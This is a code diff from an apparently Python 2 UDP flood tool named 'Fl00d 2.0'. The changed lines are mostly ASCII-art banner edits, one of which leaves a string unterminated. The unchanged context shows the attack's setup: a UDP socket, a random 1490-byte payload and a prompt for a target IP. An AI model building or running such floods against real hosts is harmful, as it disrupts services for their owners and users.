@@ -22,7 +22,11 @@ year = now.year
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 os.system("clear")
-print B+"                                /  | "
+print B+"
+print ""
+print "                                  _  "
+print "                                 / | "
+print "                                /  | "
 print "                               /   | "
 print "                               |   |         /\ "
 print "            ____               |   |         \/   "
@@ -33,10 +37,10 @@ print "       \________/   \_\   \_______/\_____________/  "
 print "              ________/   /                        "
 print "              \__________/ "+N
 print "   _____________________________________________________  "
-print "  || By: ZanAhmad ==> بريغدي أتڬير سنيفير أليت »== ||  "
+print "  || By: ZanAhmad ==> بريغدي أتڬير سنيفير أليت   == ||  "
 print "  ||__________________________________________________|| "
 print ""
-print "["+B+""+R+"#"+N+"] "+B+""+R+"بريغادي اتڬير سنيفير أليت"+N+"   Fl00d 2.0 - "+B+""+R+"BASE"+N
+print "["+B+""+R+"#"+N+"] "+B+""+R+"بريغادي اتڬير سنيفير أليت"+N+" Fl00d 2.0 - "+B+""+R+"BASE"+N
 print "  ♥️__________________________________________________♥️"
 print ""
 ip = raw_input('[$] T@rget 1P: ')
